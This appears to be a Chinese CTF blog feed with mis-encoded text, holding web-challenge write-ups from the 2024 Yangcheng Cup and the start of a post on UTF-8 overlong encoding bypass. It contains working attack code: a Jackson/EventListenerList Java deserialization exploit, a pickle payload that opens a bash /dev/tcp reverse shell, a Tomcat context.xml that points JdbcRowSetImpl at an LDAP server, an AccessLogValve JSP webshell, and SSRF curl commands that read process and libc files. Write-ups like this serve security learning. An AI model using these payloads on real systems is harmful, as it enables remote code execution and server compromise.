    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœŸæ˜¯ä¸€åœºé…£ç•…æ·‹æ¼“çš„èµ¤çŸ³å•Šã€‚</p><p>è¿˜æœ‰é˜´å…µå‡Œæ™¨ä¸‰ç‚¹ä¸Šåˆ†çš„ï¼Œé—²é±¼pyå“¥é—¹éº»äº†ã€‚ç›´æ¥ç»™æˆ‘ä»¬ä»ç¬¬ä¸€å¹²åˆ°ç¬¬åå»äº†ï¼Œç¬‘å¸äº†ã€‚</p><p>æ‡’å¾—è¯´äº†ï¼Œç›´æ¥æ¥å§ã€‚</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>å‘ç°getGiftè¿™ä¸ªgetteræ–¹æ³•å¯ä»¥ç›´æ¥å†™ç±»åŠ è½½å™¨ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240830213741544.png" alt="image-20240830213741544"></p><p>ç»•è¿‡fileä¹Ÿå¾ˆç®€å•ï¼Œå‰é¢åŠ ä¸ª<code>:file:/</code>å°±ç»•äº†ã€‚</p><p>æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„staticä»£ç å—çš„jaråŒ…ï¼Œç„¶åç”¨åˆ°ä¸€ä¸ªä»AliyunCTF2024é‡Œå­¦åˆ°çš„æ¯”è¾ƒæ–°çš„JacksonåŸç”Ÿï¼š</p><p><code>EventListenerList#readObject -&gt; JacksonToString2Getter</code></p><p>è¿›åˆ°userçš„getGiftåï¼Œä½¿ç”¨jar:åŠ è½½æ¶æ„ç±»jar:file:templates&#x2F;evil.jar!&#x2F;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-comment">//import com.xiinnn.template.ToStringClass;</span><br><span class="hljs-comment">//import com.xiinnn.tostring2getter.JacksonToString2Getter;</span><br><span class="hljs-keyword">import</span> com.example.ycbjava.bean.User;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><span class="hljs-keyword">import</span> java.sql.Driver;<br><br><span class="hljs-comment">// EventListenerList#readObject -&gt; toString</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        ToStringClass toStringClass = new ToStringClass();</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.username=<span class="hljs-string">&quot;jar:file:templates/evil.jar!/eval&quot;</span>;<br><br>        <span class="hljs-comment">//if here you don&#x27;t use try-catch, the program will throw an exception and execute fail.</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br><span class="hljs-comment">//        JacksonToString2Getter jackson = new JacksonToString2Getter();</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(node);<br>        setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] code = serialize(list);<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br><span class="hljs-comment">//        unserialize(code);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = c.getDeclaredField(fieldName);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;<br>                c = c.getSuperclass();<br>            &#125;<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] code)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(code);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ å¤„ä¼ å…¥æ¶æ„jarï¼Œç„¶åæ‰“&#x2F;user&#x2F;serè·¯ç”±ååºåˆ—åŒ–ç›´æ¥æ·»åŠ classloaderï¼Œåå¼¹shelläº¤äº†ã€‚</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>æ‰“çƒ‚çš„é¢˜ã€‚</p><p>pickleååºåˆ—åŒ–ï¼Œæ‰‹æ“ä¸ªopcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie,cookie_encode,cookie_encode_raw<br><br>url = <span class="hljs-string">&quot;http://139.155.126.78:32301/&quot;</span> <span class="hljs-comment">#lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:5000/&quot; #lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><br>res = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;testtest&quot;</span>&#125;<br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">S&#x27;admin&#x27;</span><br><span class="hljs-string">dt.&#x27;&#x27;&#x27;</span><br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">(S&#x27;os&#x27;</span><br><span class="hljs-string">S&#x27;system&#x27;</span><br><span class="hljs-string">\x93S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span><br><span class="hljs-string">odt.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># a = set_cookie(, res, secret=secret_code)</span><br><span class="hljs-comment"># a= cookie_encode((&quot;user&quot;, res), secret_code)</span><br>a= cookie_encode_raw(data, secret_code)<br><span class="hljs-built_in">print</span>(a)<br><br>re = requests.get(url+<span class="hljs-string">&quot;/board&quot;</span>,cookies=&#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:a.decode()<br>&#125;)<br><span class="hljs-built_in">print</span>(re.text)<br></code></pre></td></tr></table></figure><h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>æœ‰ç‚¹å¥½ç©çš„é¢˜ï¼Œä½†æ˜¯éé¢„æœŸä¹Ÿè›®å¤šâ€¦â€¦</p><p>ç»™äº†ä¸€ä¸ªç™»å½•è·¯ç”±ï¼Œè¯»xmlçš„è·¯å¾„ï¼Œweb.xmlç»™banäº†ã€‚é¦–å…ˆè¯»åˆ°è´¦å¯†ç™»å½•ï¼Œé‡Œé¢åˆæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¼ xmlã€‚</p><p>è¿™é“å¯ä»¥è¦†ç›–<code>/opt/tomcat/myapp/WEB-INF/web.xml</code>ï¼Œä½†è¦†ç›–ä¸äº†confç›®å½•ä¸‹çš„web.xmlã€‚</p><p>æ‰€ä»¥ç¬¬ä¸€é¢˜æˆ‘ä»¬ç›´æ¥è¦†ç›–tomcat-web.xmlï¼Œè®©xmlè§£ææˆjspã€‚</p><p>ä¸Šä¼ jspæœ¨é©¬å°±å®Œäº‹äº†ã€‚è¿‡ç¨‹å°±å·æ‡’ä¸å†™äº†ã€‚</p><h2 id="tomtom2-revenge"><a href="#tomtom2-revenge" class="headerlink" title="tomtom2_revenge"></a>tomtom2_revenge</h2><p>web.xmlå½»åº•banäº†ï¼Œä¸èƒ½å¥—ç”¨æ–¹æ³•è®©xmlè§£ææˆjspäº†ã€‚é€šè¿‡tomtom2è¯»æºç ï¼Œåˆ†æå‘ç°tomcatæœ‰h2çš„libã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ‰“jndiåˆ°h2çš„getterã€‚</p><p>ä¸Šä¼ è·¯å¾„ä¸º<code>/opt/tomcat/conf/</code>ï¼Œç›´æ¥è¦†ç›–è¯¥ç›®å½•ä¸‹çš„<code>context.xml</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="hljs-comment">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="hljs-comment">  this work for additional information regarding copyright ownership.</span><br><span class="hljs-comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="hljs-comment">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="hljs-comment">  the License.  You may obtain a copy of the License at</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment">  See the License for the specific language governing permissions and</span><br><span class="hljs-comment">  limitations under the License.</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-comment">&lt;!-- The contents of this file will be loaded for each web application --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span><br>    <span class="hljs-comment">&lt;!-- web application will be reloaded.                                   --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/tomcat-web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    &lt;Manager pathname=&quot;&quot; /&gt;</span><br><span class="hljs-comment">    --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">dataSourceName</span>=<span class="hljs-string">&quot;ldap://vps:1389/TomcatJDBC/H2/Java/ReverseShell/vps/port&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">autoCommit</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†é—®äº†å…¶ä»–é˜Ÿäº¤æµäº†ä¸‹ï¼Œè¿™é“é¢˜è¿˜æœ‰ä¸ªéé¢„æœŸæ˜¯è¦†ç›–<code>META-INF/context.xml</code>ï¼Œåˆ©ç”¨<code>org.apache.catalina.valves.AccessLogValve</code></p><p>ä¸Šä¼ è·¯å¾„ä¸º<code>./META-INF</code>ï¼Œä¼ å…¥ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Value</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;/opt/tomcat/webapps/myapp/&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;shell&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.jsp&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%&#123;Cookie&#125;i&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">resolveHosts</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¸¦ä¸€ä¸ªæ¶æ„cookieè®¿é—®&#x2F;myappï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è®¿é—®<code>shell.2024-08-27.jsp</code>ï¼Œï¼ˆåç¼€ç”Ÿæˆæ—¶é—´å³å½“å¤©ï¼‰å†…å­˜é©¬å°±æ³¨å…¥äº†ï¼Œå‚æ•°ä¸ºcmdï¼Œç¡®å®é«˜æ‰‹ã€‚</p><h2 id="ç½‘ç»œç…§ç›¸é¦†"><a href="#ç½‘ç»œç…§ç›¸é¦†" class="headerlink" title="ç½‘ç»œç…§ç›¸é¦†"></a>ç½‘ç»œç…§ç›¸é¦†</h2><p>æ‰“SSRFçš„ä¸œè¥¿ï¼Œfile:&#x2F;&#x2F;ä¼ªåè®®å¯è¯»æ–‡ä»¶ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224400557.png" alt="image-20240827224400557"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224416038.png" alt="image-20240827224416038"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224431698.png" alt="image-20240827224431698"></p><p>hash_fileå¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œè€Œä¸”å› ä¸ºè¿™æ˜¯php8æ‰“ä¸äº†pharï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°CVE-2024-2961é‚£ä¸ªiconvçš„æ´ã€‚</p><p>å…ˆä½¿ç”¨fileä¼ªåè®®è¯»å–mapså’Œlibcï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/proc/self/maps&quot;</span> -o maps<br>curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span> -o lic.so<br></code></pre></td></tr></table></figure><p>ç„¶åä»sqlæ³¨å…¥å¤„æ‰“æ”¹è‰¯çš„iconv-payload:</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224653523.png" alt="image-20240827224653523"></p><p>åå¼¹ä¸äº†shellï¼Œå¯èƒ½æ˜¯å‘½ä»¤é—®é¢˜ï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥äº¤äº†ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224724342.png" alt="image-20240827224724342"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224731151.png" alt="image-20240827224731151"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æ¯”èµ›å½“å¤©çœŸçš„ç´¯å¾—è·Ÿä¸ªç‹—ä¼¼çš„ï¼Œä»æ—©ä¸Š9ç‚¹ä¸€ç›´æ‰“åˆ°å‡Œæ™¨2ç‚¹ï¼Œè¿˜ä¸æ•¢ç¡è§‰ï¼Œä¸‰ç‚¹å°±è¢«å·å®¶äº†ã€‚</p><p>æˆ‘çš„è¯„ä»·æ˜¯ä¸ä¼šåŠæ¯”èµ›å°±ä¸è¦åŠã€‚å–œæ¬¢æ24å°æ—¶èµ›åˆ¶ï¼Œè¿˜æ²¡æœ‰pyæ£€æµ‹æœºåˆ¶ï¼Œflagéƒ½æ˜¯é™æ€flagï¼Œå®Œå…¨æˆpyå¤§èµ›äº†ï¼Œè¿™å°±æ˜¯ycbã€‚</p><p>æ—¢æ¥ä¹‹åˆ™å®‰ä¹‹ï¼Œæˆ‘å€’è¦çœ‹çœ‹9æœˆ11å·çº¿ä¸‹éƒ½æ˜¯äº›å•¥å¦–é­”é¬¼æ€ªã€‚</p><p>ä»¥ä¸Šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UTF-8 Overlong Encoding Bypass</title>
    <link href="/2024/08/22/Overlong-Encoding-utf-8-Bypass/"/>
    <url>/2024/08/22/Overlong-Encoding-utf-8-Bypass/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>UTF-8 Overlong Encoding</code>ä¸€ç§ç»•è¿‡é»‘åå•çš„æ‰‹æ®µï¼Œä¹‹å‰æ‰“é¢˜é‡åˆ°è¿‡ä¸¤æ¬¡ï¼Œè¿™æ¬¡å°å°æ€»ç»“ä¸€ä¸‹ã€‚</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master Â· qi4L&#x2F;JYso (github.com)</a></p><p>ä¸€æ¬¡æ˜¯åœ¨äº¬éº’CTFé‡Œç”¨è¿™ä¸ªæ–¹æ³•æ‰“å‡ºè¿‡ä¸€é“ï¼Œè¿˜æœ‰ä¸€é“æ˜¯æœ€è¿‘çš„å·…å³°æå®¢JDK17+CCé“¾çš„ç»•è¿‡ã€‚</p><p>Pç‰›ä»‹ç»äº†UTF-8ç¼–ç æ–¹å¼ä»¥åŠOverlong Encodingçš„æ”»å‡»ï¼š<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html#0x04-overlong-encodingwaf">UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜ | ç¦»åˆ«æ­Œ (leavesongs.com)</a>ï¼Œåœ¨æ­¤æˆ‘ä¸å†å¤šè¯´ã€‚</p><p>å¯ä»¥é€šè¿‡javassistæ¥å¯¹writeUTFå‡½æ•°è¿›è¡Œä¿®æ”¹ï¼Œæ’æ¡©åœ¨agentå¤„ï¼š<a href="https://xz.aliyun.com/t/14300?time__1311=GqAxuD9QiQDQ0=D/82cqYuOrzG881HDgWoD">javaååºåˆ—åŒ–é€šè¿‡java agentå®ç°utf-8 Overlong Encoding - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œè¿˜æ˜¯ç»“åˆé¢˜ç›®æ¥è®²ï¼Œå› ä¸ºè¿™ç®—ä¸€ä¸ªBypassçš„æŠ€å·§ï¼Œå…‰è®²ç†è®ºè‚¯å®šä¸å¤Ÿã€‚</p><h2 id="äº¬éº’CTF2024-Ezjvav"><a href="#äº¬éº’CTF2024-Ezjvav" class="headerlink" title="äº¬éº’CTF2024-Ezjvav"></a>äº¬éº’CTF2024-Ezjvav</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>admin&#x2F;adminå¼±å¯†ç ç™»å½•ï¼Œ</p><p>æ‰«ç½‘é¡µå‘ç°&#x2F;js&#x2F;manage.jsï¼Œè®¿é—®å¾—åˆ°jsæ··æ·†ä»£ç ï¼Œç›´æ¥gptæ¢­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(<span 